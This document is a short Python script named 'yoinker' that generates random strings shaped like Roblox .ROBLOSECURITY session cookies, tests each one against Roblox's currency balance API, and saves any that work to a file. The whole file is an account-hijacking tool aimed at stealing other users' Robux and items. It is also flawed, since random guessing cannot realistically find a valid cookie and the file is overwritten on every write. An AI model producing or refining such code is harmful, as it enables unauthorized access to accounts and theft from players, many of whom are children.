import random
import math
import requests
import json
import robloxapi
import sys
import concurrent

alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

def yoinker():
    while True:
        letterAmount = random.randint(468, 481)
        randomLetters = ""
    
        i = 0
        while i < letterAmount:
            if math.floor(random.randint(0, 1)) == 1:
                randomLetters = randomLetters + alphabet[random.randint(0, 25)]
            else:
                randomLetters = randomLetters + str(random.randint(0, 9))
            i = i + 1

        cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + randomLetters

        session = requests.Session()
        try:
            session.cookies[".ROBLOSECURITY"] = cookie
            robux = session.get("https://api.roblox.com/currency/balance").json()["robux"]
            with open("cookies.txt","w") as f:
                f.write(cookie + "\n")
            session.close()
        except:
            print("")
        session.close()
        print(cookie)
yoinker()